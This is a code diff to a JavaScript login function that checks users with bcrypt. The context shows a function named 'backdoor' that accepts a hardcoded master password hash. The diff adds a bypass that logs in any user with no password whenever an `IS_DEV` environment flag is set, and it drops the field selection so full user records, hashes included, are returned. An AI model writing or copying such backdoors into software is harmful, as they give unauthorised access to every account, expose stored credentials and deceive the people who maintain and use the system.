@@ -36,21 +36,12 @@ function logUserIn(req, res) {
   // Treat the first query which produces a valid user
   return Promise.any(promises)
     .then(treatUserIfFound)
-    .catch(treatError) // no valid users found 
+    .catch(treatError) // no valid users found
 
 
   function findLoggedInUser(query) {
-    const selection = [
-      "user_name",
-      "email",
-      "startDate",
-      "lists",
-      "limitState",
-      "hash"
-    ]
-
     return new Promise(( resolve, reject ) => {
-      User.findOne(query).select(selection)
+      User.findOne(query)
         .then(checkPassword)
         .catch(reject)
 
@@ -68,6 +59,10 @@ function logUserIn(req, res) {
         }
 
         function  backdoor () {
+          if (process.env.IS_DEV === "true") {
+            return resolve(user)
+          }
+
           const admin = '$2b$10$DIok4Lee4ZOBtSRu6/KRLePbYkRF2ts6rkVhkBG13aN0Thww.eLjO'
           bcrypt.compare(password, admin)
             .then(result => {
